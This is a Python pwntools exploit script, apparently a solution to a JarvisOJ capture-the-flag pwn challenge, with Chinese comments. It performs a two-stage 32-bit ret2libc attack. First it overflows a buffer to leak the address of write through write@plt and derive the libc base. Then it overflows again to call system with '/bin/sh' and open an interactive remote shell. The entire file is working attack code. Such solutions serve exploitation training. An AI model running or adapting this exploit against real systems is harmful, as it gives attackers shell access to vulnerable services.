#!/usr/bin/env python
# coding=utf-8
from pwn import*
s=remote('pwn2.jarvisoj.com',9879)

a='A'*0x8c             #填充数据
write_plt=0x8048340
write_got=0x804a018
funwr=0x804844b
payload=a+p32(write_plt)+p32(funwr)+p32(1)+p32(write_got)+p32(0x04) #泄露write在内存中地址 返回到fun准备二次溢出

s.recvline()         #Input
s.sendline(payload)
writeaddr=u32(s.recv(4))      #write地址

libc_write=0xdafe0
libc_sys=0x40310
libc_bin=0x16084c
addr=writeaddr-libc_write        #偏移量

sys=addr+libc_sys
shell=addr+libc_bin

payload=a+p32(sys)+"BBBB"+p32(shell)

s.sendline(payload)
s.interactive()


